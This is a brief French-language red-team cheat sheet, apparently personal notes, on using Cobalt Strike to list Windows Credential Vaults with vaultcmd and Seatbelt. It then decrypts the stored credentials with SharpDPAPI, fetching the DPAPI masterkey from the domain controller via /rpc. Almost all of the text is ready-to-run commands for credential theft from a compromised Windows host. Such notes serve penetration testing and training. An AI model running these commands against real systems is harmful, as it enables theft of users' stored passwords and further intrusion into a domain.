# Cobalt Strike


Lister les vaults avec commande native

```
run vaultcmd /list
run vaultcmd /listcreds:"Informations d'identification Windows" /all
```

Possible avec seatbelt également

```
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```

Déchiffrer les creds dans les vaults :
## SharpDPAPI

Execute Assembly avec SharpDPAPI -> credentials tente de déchiffrer ce qu'il y a dans le vault, /rpc récupère la masterkey auprès du DC qui en détient une copie afin de déchiffrer la clé AES ayant permit de chiffrer le vault.

```
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
```
